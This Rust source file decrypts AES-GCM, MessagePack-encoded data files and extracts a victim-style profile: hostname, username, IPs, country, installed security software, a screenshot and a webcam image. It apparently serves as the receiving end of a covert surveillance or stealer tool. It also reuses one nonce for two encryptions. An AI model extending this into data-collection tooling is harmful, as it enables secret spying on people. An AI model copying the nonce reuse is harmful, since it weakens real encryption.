use std::fs::File;
use std::io::Read;
use serde::{Serialize, Deserialize};
use rmp_serde::{decode::from_slice as from_msgpack_slice};
use base64::{engine::general_purpose, Engine as _};
use aes_gcm::{Aes256Gcm, Nonce};
use aes_gcm::aead::{Aead, KeyInit};

#[derive(Serialize, Deserialize, Debug)]
pub struct SystemInfo {
    pub hostname: String,
    pub os_name: String,
    pub os_version: String,
    pub username: String,
    pub global_ip: String,
    pub local_ip: String,
    pub cores: usize,
    pub security_software: Vec<String>,
    pub processor: String,
    pub country_code: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct ImageData {
    pub screenshot: String,
    pub webcam_image: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct EncryptedData {
    info: String,
    images: String,
    encrypted: bool,  // Changed to a required field (always true in the new format)
}

#[derive(Serialize, Deserialize, Debug)]
struct KeyData {
    key: String,
    nonce: String,
}



// Actual AES-GCM decryption
pub fn decrypt_aes_gcm(encrypted_data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let cipher = Aes256Gcm::new(aes_gcm::Key::<Aes256Gcm>::from_slice(key));
    let plaintext = cipher.decrypt(Nonce::from_slice(nonce), encrypted_data)
        .map_err(|e| format!("AES-GCM decryption failed: {:?}", e))?;
    Ok(plaintext)
}

// Main decryption function
pub fn decrypt_data_file(file_path: &str, key_file: Option<&str>) -> Result<(SystemInfo, ImageData), Box<dyn std::error::Error>> {
    // 1. Read the data file
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    // 2. Decode MessagePack
    let encrypted_data: EncryptedData = from_msgpack_slice(&buffer)?;

    // 3. Decrypt the encrypted payload (new format only)
    if !encrypted_data.encrypted {
        return Err("This file is not encrypted. A file created with the new format is required.".into());
    }

    let key_file_path = key_file.unwrap_or("key.bin");
    
    // Load the key file
    let mut key_file_handle = File::open(key_file_path)
        .map_err(|_| format!("Key file not found: {}. AES decryption requires the matching key file.", key_file_path))?;
    let mut key_buffer = Vec::new();
    key_file_handle.read_to_end(&mut key_buffer)?;
    
    // Decode the key data from MessagePack
    let key_data: KeyData = from_msgpack_slice(&key_buffer)
        .map_err(|_| "The key file format is invalid.")?;
    
    let key_bytes = general_purpose::STANDARD.decode(&key_data.key)
        .map_err(|_| "Failed to Base64 decode the key.")?;
    let nonce_bytes = general_purpose::STANDARD.decode(&key_data.nonce)
        .map_err(|_| "Failed to Base64 decode the nonce.")?;
    
    if key_bytes.len() != 32 {
        return Err(format!("Invalid key length: expected 32 bytes but got {} bytes.", key_bytes.len()).into());
    }
    if nonce_bytes.len() != 12 {
        return Err(format!("Invalid nonce length: expected 12 bytes but got {} bytes.", nonce_bytes.len()).into());
    }

    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    key.copy_from_slice(&key_bytes);
    nonce.copy_from_slice(&nonce_bytes);

    let enc_info = general_purpose::STANDARD.decode(&encrypted_data.info)
        .map_err(|_| "Failed to Base64 decode the system information payload.")?;
    let enc_images = general_purpose::STANDARD.decode(&encrypted_data.images)
        .map_err(|_| "Failed to Base64 decode the image payload.")?;

    let (decrypted_info, decrypted_images) = (
        decrypt_aes_gcm(&enc_info, &key, &nonce)
            .map_err(|e| format!("Failed to decrypt system information: {}", e))?,
        decrypt_aes_gcm(&enc_images, &key, &nonce)
            .map_err(|e| format!("Failed to decrypt image data: {}", e))?
    );

    // 4. Decode MessagePack
    let system_info: SystemInfo = from_msgpack_slice(&decrypted_info)?;
    let image_data: ImageData = from_msgpack_slice(&decrypted_images)?;

    Ok((system_info, image_data))
}

// Save screenshot to a file
pub fn save_screenshot(base64_data: &str, output_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    if base64_data.is_empty() {
        return Ok(());
    }
    
    let image_data = general_purpose::STANDARD.decode(base64_data)?;
    std::fs::write(output_path, image_data)?;
    Ok(())
}

// Save webcam image to a file
pub fn save_webcam_image(base64_data: &str, output_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    if base64_data.is_empty() {
        return Ok(());
    }
    
    let image_data = general_purpose::STANDARD.decode(base64_data)?;
    std::fs::write(output_path, image_data)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_aes_gcm_encrypt_decrypt() {
        let key = [1u8; 32];
        let nonce = [2u8; 12];
        let plaintext = b"Secret message";

        // Encryption
        let cipher = Aes256Gcm::new(aes_gcm::Key::<Aes256Gcm>::from_slice(&key));
        let ciphertext = cipher.encrypt(Nonce::from_slice(&nonce), plaintext.as_ref()).unwrap();

        // Decryption
        let decrypted = decrypt_aes_gcm(&ciphertext, &key, &nonce).unwrap();
        assert_eq!(decrypted, plaintext);
    }

    #[test]
    fn test_key_data_serialization() {
        let key_data = KeyData {
            key: "test_key_base64".to_string(),
            nonce: "test_nonce_b64".to_string(),
        };
        
        let serialized = rmp_serde::to_vec(&key_data).unwrap();
        let deserialized: KeyData = rmp_serde::from_slice(&serialized).unwrap();
        
        assert_eq!(key_data.key, deserialized.key);
        assert_eq!(key_data.nonce, deserialized.nonce);
    }
}